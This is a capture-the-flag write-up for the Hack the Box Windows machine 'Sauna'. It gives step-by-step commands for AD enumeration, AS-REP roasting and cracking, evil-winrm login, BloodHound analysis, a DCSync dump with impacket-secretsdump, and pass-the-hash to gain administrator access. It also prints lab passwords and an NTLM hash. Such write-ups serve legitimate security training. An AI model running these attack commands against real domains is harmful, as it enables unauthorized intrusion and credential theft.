# Hack the Box - Sauna

```CSS
Machine IP: 10.10.10.175 - Windows
```

Add to DNS
```CSS
10.10.10.175    egotistical-bank.local sauna sauna.egotistical-bank.local
```

## Nmap
### TCP All Ports

```CSS
▶ nmap -Pn -sS -p- 10.10.10.175 -T4 --min-rate 1000 -oN surface.nmap

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 09:39 IST
Nmap scan report for 10.10.10.175
Host is up (0.18s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49695/tcp open  unknown
49720/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 124.54 seconds
```

### Open TCP Ports Service Version and Default Scripts
```CSS
▶ nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49695,49720 10.10.10.175 -oN deep.nmap

Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 09:26 IST
Nmap scan report for 10.10.10.175
Host is up (0.18s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-15 10:56:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49720/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m41s
| smb2-time: 
|   date: 2023-04-15T10:57:10
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.84 seconds
```

![image](https://user-images.githubusercontent.com/83878909/232182021-fe6ce919-1d8e-4fad-acdb-1925137c81bd.png)

---

## HTTP
### Home
![image](https://user-images.githubusercontent.com/83878909/232183100-b0ba710b-a0d0-456f-8428-866108bab641.png)

### Users
![image](https://user-images.githubusercontent.com/83878909/232183269-6ce5ead2-098a-42c1-a77b-99e9b68cce63.png)

```CSS
Fergus Smith
Shuan Coins
Sophie Driver
Bowie Taylor
Hugo Bear
Steven Kerb
```

---

## LDAPSearch
### Base DN (Distinguished Name)
```CSS
▶ ldapsearch -H ldap://10.10.10.175 -x -s base namingcontexts
```
![image](https://user-images.githubusercontent.com/83878909/232185487-95840fae-d92d-4a03-9795-cbddc1511dba.png)

### Subtree Attributes
```CSS
▶ ldapsearch -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub
```
![image](https://user-images.githubusercontent.com/83878909/232194332-9d8dc461-a687-4416-a6f6-94b4d5b523e9.png)

---

## Kerberos
### Kerberos Authentication Attack
  - Identify valid users.
  - Create a wordlist of potential usernames using the names found earlier.

## Validate Usernames
```CSS
▶ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt
```
![image](https://user-images.githubusercontent.com/83878909/232199517-5274525c-d5f5-4925-b2c9-5fc31b23082f.png)
```CSS
administrator@egotistical-bank.local
fsmith@egotistical-bank.local
```
### AS-REP Roasting
  - Find users who have Kerberos preauthentication disabled and get their TGT.
```CSS
▶ kerbrute userenum --dc 10.10.10.175 -d egotistical-bank.local users.txt
```
![image](https://user-images.githubusercontent.com/83878909/232200855-613b961b-3a89-4a3c-b2ed-6f3fa3aa124f.png)

### Crack TGT
  - Crack the `TGT` obtained for user `fsmith` to get the password.
```CSS
▶ john --format:krb5asrep ticket.hrb5 --wordlist=/usr/share/wordlists/rockyou.txt
```
![image](https://user-images.githubusercontent.com/83878909/232202658-937f7339-41a3-4614-b60f-dc84214e3cda.png)

```CSS
fsmith:Thestrokes23
```

---

## SMB
### Enumerate SMB Shares
  - Enumerate the shares available, which are shared directories or resources that can be accessed.
```CSS
▶ crackmapexec smb 10.10.10.175 -u fsmith -p Thestrokes23 --shares
```
![image](https://user-images.githubusercontent.com/83878909/232202527-9d199655-95f5-451b-9023-eaa07f30e094.png)

---

## WINRM
### Login
  - Check for `Windows Remote Management` login using the found credentials.
```CSS
▶ crackmapexec winrm 10.10.10.175 -u fsmith -p Thestrokes23
```
![image](https://user-images.githubusercontent.com/83878909/232202957-f0300681-06e3-462b-ac69-5d2b4a84df3b.png)

---

### Foothold
  - Login as user `fsmith`.
```CSS
▶ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23
```
![image](https://user-images.githubusercontent.com/83878909/232203185-5855b62c-6fcc-4267-878c-f6748b30112d.png)

---

## Privilege Escalation
### WinPEAS
  - Upload `winPEASx64.exe` to "Sauna".
  - Execute
```CSS
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload winPEASx64.exe
```
![image](https://user-images.githubusercontent.com/83878909/232273868-7d59e938-0c19-440a-a3b0-068c1f34254d.png)
![image](https://user-images.githubusercontent.com/83878909/232273829-d93a10a9-96cc-4649-afbc-e29b10572ad1.png)

#### WinPEAS Output
![image](https://user-images.githubusercontent.com/83878909/232279612-c3fb9bd3-5ed9-4b76-a656-465bada7137d.png)
  - Credentials: `svc_loanmanager:Moneymakestheworldgoround!`

---

## BloodHound
  - Start `neo4j` as `root`.
```CSS
▶ neoj4 console
```

  - Start `bloodhound`.
```CSS
▶ BloodHound --no-sandbox
```

  - Upload `SharpHound.exe`.
  - Launch `SharpHound.exe`.
```CSS
▶ upload `SharpHound.exe`
```
![image](https://user-images.githubusercontent.com/83878909/232280398-222104de-1d6d-484d-b553-867bc5b2760f.png)
![image](https://user-images.githubusercontent.com/83878909/232280509-77195659-fdce-4f82-8042-321bb62cbf67.png)

  - Download data
```CSS
*Evil-WinRM* PS C:\Users\FSmith\Documents> download 20230416073219_BloodHound.zip
```
![image](https://user-images.githubusercontent.com/83878909/232280690-87cf71b4-1bbc-4769-b4a3-e69b4919f89e.png)
![image](https://user-images.githubusercontent.com/83878909/232280791-cb102718-89f9-45e7-8ad6-675a4d8c3e0f.png)

  - Upload `zip` to `BloodHound`.
![image](https://user-images.githubusercontent.com/83878909/232280907-575a4fc0-c07f-48ff-b97a-d32349bcca26.png)

  - Mark owned users `FSMITH@EGOTISTICAL-BANK.LOCAL` and `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL`.
![image](https://user-images.githubusercontent.com/83878909/232281206-b02d1834-b91b-4b64-8c11-361c8a6e550b.png)

  - Find Pricipals with DCSync Rights
![image](https://user-images.githubusercontent.com/83878909/232283846-88144e0c-870b-4cc0-826f-a0838112bfae.png)
![image](https://user-images.githubusercontent.com/83878909/232283882-1c6dd475-a1b7-4fa3-bdbb-22e313bd6b0b.png)
![image](https://user-images.githubusercontent.com/83878909/232283908-3657106f-226c-44b4-8dd4-92d4def04dbb.png)

---

## DCSync Attack - Impacket
```CSS
▶ impacket-secretsdump egotistical-bank.local/svc_loanmgr@10.10.10.175 
```
  - Password: Found earlier `Moneymakestheworldgoround!`.
![image](https://user-images.githubusercontent.com/83878909/232284247-391e9a65-ebcc-407c-a59a-e56a44871185.png)

---

## Pass the Hash Attack
```CSS
▶ crackmapexec smb 10.10.10.175 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```
![image](https://user-images.githubusercontent.com/83878909/232284757-aa2a4478-5692-4aba-ae30-d57fc67e5336.png)

  - User the NTLM hash twice instead of using "LANMAN:NTLM".
```CSS
▶ impacket-psexec egotistical-bank.local/administrator@10.10.10.175 -hashes 823452073d75b9d1cf70ebdf86c7f98e:823452073d75b9d1cf70ebdf86c7f98e
```
![image](https://user-images.githubusercontent.com/83878909/232285865-769bbc96-0b3d-41f3-8426-eeb010a363ed.png)

